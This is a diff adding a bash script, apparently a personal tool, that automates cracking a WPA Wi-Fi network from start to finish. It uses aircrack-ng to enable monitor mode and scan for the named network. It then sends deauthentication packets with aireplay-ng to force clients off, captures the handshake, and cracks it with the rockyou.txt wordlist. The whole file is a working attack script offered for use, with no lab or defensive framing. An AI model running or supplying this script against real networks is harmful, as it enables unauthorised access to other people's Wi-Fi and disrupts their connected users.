@@ -1,0 +1,46 @@
+#!/bin/bash
+# Script made by Aaron Vigal. http://www.aaronvigal.com
+
+# Check to make sure the dependecies are installed
+PKG_OK=$(dpkg-query -W --showformat='${Status}\n' aircrack-ng|grep "install ok installed")
+if [ "" == "$PKG_OK" ]; then
+  echo "Dependecy not found. Setting up aircrack-ng."
+  sudo apt-get --force-yes --yes install aircrack-ng
+fi
+read -p "What is the name of the network? " name
+# Write the name you entered to a text file
+echo $name > name.txt
+# Start moitor mode on wlan0
+echo " [+] Killing off harmfull proccesses..."
+airmon-ng start wlan0 > PIDOutput.txt
+python FindPID.py
+# Get the info for the network
+echo " [+] Fetching available networks..."
+./loading15&airodump-ng wlan0mon -w BSSIDOutput --write-interval 10 -o csv> /dev/null 2>&1& sleep 15; kill $!
+mv BSSIDOutput-01.csv BSSIDOutput.txt
+python FindBSSID.py
+bssid=$(<bssid.txt)
+channel=$(<channel.txt)
+# Find users on network
+echo " [+] Finding user BSSID on $name...               "
+./loading10&airodump-ng -c $channel -w DEAUTHOutput --bssid $bssid wlan0mon --write-interval 5 -o csv > /dev/null 2>&1& sleep 10; kill $!
+mv DEAUTHOutput-01.csv DEAUTHOutput.txt
+python FindDeauth.py
+deauth=$(<deauth.txt)
+# Send deauth packets
+echo " [+] Sending deauthentication packets to $deauth..."
+aireplay-ng -0 3 -a $deauth wlan0mon > /dev/null 2>&1
+# Listen for packets
+echo " [+] Waiting on $bssid for handshake..."
+./loading10&airodump-ng -c $channel -w $name --bssid $bssid wlan0mon > /dev/null 2>&1& sleep 10; kill $!
+# Stop monitor mode
+echo " [+] Disabling monitor mode on wlan0mon...         "
+airmon-ng stop wlan0mon > /dev/null 2>&1
+# Start the decryption proccess using rockyou.txt
+echo " [+] Cracking WPA handshake..."
+sleep 2
+aircrack-ng -w /usr/share/wordlists/rockyou.txt $name-01.cap
+echo ""
+# Remove files
+rm name.txt PIDOutput.txt pythonOutput.txt BSSIDOutput.txt channel.txt deauth.txt bssid.txt DEAUTHOutput.txt
+rm $name-*
